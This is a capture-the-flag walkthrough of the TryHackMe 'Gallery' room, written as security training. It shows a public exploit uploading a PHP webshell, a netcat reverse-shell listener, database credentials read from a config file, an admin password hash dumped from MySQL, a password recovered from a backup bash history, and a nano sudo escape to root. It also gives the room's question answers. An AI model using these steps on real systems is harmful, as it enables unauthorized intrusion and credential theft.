<p align="center">
  THM : Gallery<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/cgUsw3r.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Exploiting Simple Image Gallery](#exploiting-simple-image-gallery)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's run an agressive [nmap](https://nmap.org/) scan against the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-19 23:26 CEST
Nmap scan report for 10.10.140.54
Host is up (0.076s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.67 seconds
```

There is two websites on the target machine, one on port 80, and one on port 8080.

**Question : How many ports are open ?**  
**Answer : 2**  

## Website enumeration

Let's take a look at the website using a web browser :  
![](https://i.imgur.com/MM8ORZw.jpg)  

Nothing interesting on port 80, let's take a look at port 8080 :  
![](https://i.imgur.com/7KgZpke.jpg)  

There is a login page, and it seems that a CMS named "Simple Image Gallery System" is installed. Let's search for it on [Exploit-DB]() :  
![](https://i.imgur.com/KU54nKd.jpg)  

So there is an exploit to get a Remote Code Execution on the target.

**Question : What's the name of the CMS ?**  
**Answer : Simple Image Gallery**  

## Exploiting Simple Image Gallery

Now that we know what exploit to use, let's run it against the target :  
```
attacker@AttackBox:~/Documents/THM/CTF/Gallery$ python3 50214.py 
TARGET = http://10.10.140.54/gallery/
Login Bypass
shell name TagowezuuydtgnfkwucLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.140.54/gallery/uploads/1666216200_TagowezuuydtgnfkwucLetta.php?cmd=whoami
```

Let's take a look at the URL given by the exploit using a web browser :  
![](https://i.imgur.com/iZjCRYL.jpg)  

We have a webshell ! We can execute whatever we want as user www-data. Let's get a reverse shell now. We just need to URL encode it and pass it in the "cmd" url parameter :  
```
attacker@AttackBox:~/Documents/THM/CTF/Gallery$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.140.54] 55092
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

We have a reverse shell now ! It is asked to find the hash password of admin user. If we take a look at "/var/www/html/gallery/initialize.php" file, we have the credentials for the 
database :  
```
$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

First, let's stabilize our shell, then let's use those credentials to log in on mysql :  
```
www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 175
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Now, we can search in mysql for the admin password hash :  
```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use gallery_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1666216200_TagowezuuydtgnfkwucLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-10-19 21:50:27 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)

MariaDB [gallery_db]>
```

We have the admin password hash !

**Question : What's the hash password of the admin user ?**  
**Answer : a228b12a08b6527e7978cbe5d914531c**  

## Privilege escalation

Let's escalate our privileges. If we take a look in "/var/backups", we notice a directory named "mike_home_backup" :  
```
drwxr-xr-x  3 root root  4096 Oct 19 21:25 .
drwxr-xr-x 13 root root  4096 May 20  2021 ..
-rw-r--r--  1 root root 34789 Feb 12  2022 apt.extended_states.0
-rw-r--r--  1 root root  3748 Aug 25  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root  3516 May 21  2021 apt.extended_states.2.gz
-rw-r--r--  1 root root  3575 May 20  2021 apt.extended_states.3.gz
drwxr-xr-x  5 root root  4096 May 24  2021 mike_home_backup
```

We also have read permissions on this directory, so let's take a look in it :  
```
www-data@gallery:/var/backups/mike_home_backup$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Oct 19 21:25 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
```

Let's see what's inside .bash_history :  
```
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

There is mike's password ! Let's use it to login as user mike :  
```
www-data@gallery:/var/backups/mike_home_backup$ su mike 
Password: 
mike@gallery:/var/backups/mike_home_backup$
```

We are now logged in as mike. Let's get the user flag :  
```
mike@gallery:~$ ls
documents  images  user.txt
mike@gallery:~$ cat user.txt
THM{**************************}
mike@gallery:~$
```

Now, it's time to get root ! Let's take a look at our sudo rights with "sudo -l" :  
```
mike@gallery:~$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

We can run /opt/rootkit.sh as root without password ! Let's take a look at this shell script :  
```
mike@gallery:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 May 22  2021 .
drwxr-xr-x 23 root root 4096 Feb 12  2022 ..
-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh
mike@gallery:/opt$ cat rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
mike@gallery:/opt$
```

You can notice that when we will run the script, it will ask us to make a choice, and we can make the choice to open /root/report.txt with nano. So nano will also run as root. Let's search 
for "nano" on [GTFOBins](https://gtfobins.github.io/) :  
![](https://i.imgur.com/MHDkBAe.jpg)  

We can spawn a shell using nano, since nano will be running as root, the shell we will spawn will also run as root ! Let's exploit this. First, we need to run "rootkit.sh" as root :  
```
mike@gallery:/opt$ sudo /bin/bash /opt/rootkit.sh 
Would you like to versioncheck, update, list or read the report ?
```

We have to choose "read" to open nano :  
![](https://i.imgur.com/nGqLFkh.jpg)  

Now that nano is open, we just have to follow the exploit explained on [GTFOBins](https://gtfobins.github.io/). First, we press CTRL+R, and then CTRL+X :  
![](https://i.imgur.com/fHbu4Iv.jpg)  

Now, we can execute whatever we want as root. Let's spawn a shell by entering "reset; sh 1>&0 2>&0" :  
```
# whoami
root
#
```

We have a shell as root ! Now let's get the root flag :  
```
# cd /root
# ls -la
total 52
drwx------  6 root root 4096 Oct 19 22:42 .
drwxr-xr-x 23 root root 4096 Feb 12  2022 ..
-rw-------  1 root root  364 Feb 12  2022 .bash_history
-rw-r--r--  1 root root 3107 May 20  2021 .bashrc
drwx------  2 root root 4096 Feb 12  2022 .cache
drwx------  3 root root 4096 Feb 12  2022 .gnupg
drwxr-xr-x  3 root root 4096 May 20  2021 .local
-rw-------  1 root root  440 Aug 25  2021 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root 3404 May 18  2021 report.txt
-rw-r--r--  1 root root 1024 Oct 19 22:42 .report.txt.swp
-rw-r--r--  1 root root   43 May 17  2021 root.txt
drwx------  2 root root 4096 May 20  2021 .ssh
# cat root.txt
THM{***********************************}
#
```

## Conclusion

In this room, the way we have to escalate our privileges is original in my opinion. I liked this room, thanks for this room ! And thanks for reading my write ups !
